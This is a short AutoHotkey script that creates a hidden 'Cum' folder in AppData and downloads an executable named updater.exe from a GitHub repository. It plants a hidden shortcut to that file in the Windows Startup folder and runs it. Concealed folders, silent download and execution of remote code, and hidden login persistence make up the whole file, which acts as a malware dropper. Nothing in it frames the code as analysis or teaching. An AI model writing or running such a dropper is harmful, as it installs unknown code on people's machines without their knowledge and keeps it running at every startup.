#NoEnv  ; Recommended for performance and compatibility with future AutoHotkey releases.
; #Warn  ; Enable warnings to assist with detecting common errors.
SendMode Input  ; Recommended for new scripts due to its superior speed and reliability.
SetWorkingDir %A_ScriptDir%  ; Ensures a consistent starting directory.
#SingleInstance, Force ; Only launches 1 instance of this script
FileCreateDir, %A_AppData%\Cum
FileSetAttrib, +h,  %A_AppData%\Cum, 1
v := "https://github.com/JWitterick/Test/blob/main/updater.exe?raw=true"
URLDownloadToFile %v%, %A_AppData%\Cum\updater.exe
v := "https://github.com/JWitterick/Test/blob/main/local_version.txt?raw=true"
URLDownloadToFile %v%, %A_AppData%\Cum\local_version.txt
FileCreateShortcut, %A_AppData%\Cum\updater.exe, %A_Startup%\Cum.lnk
FileSetAttrib, +h,  %A_Startup%\Cum.lnk
Run,  %A_AppData%\Cum\updater.exe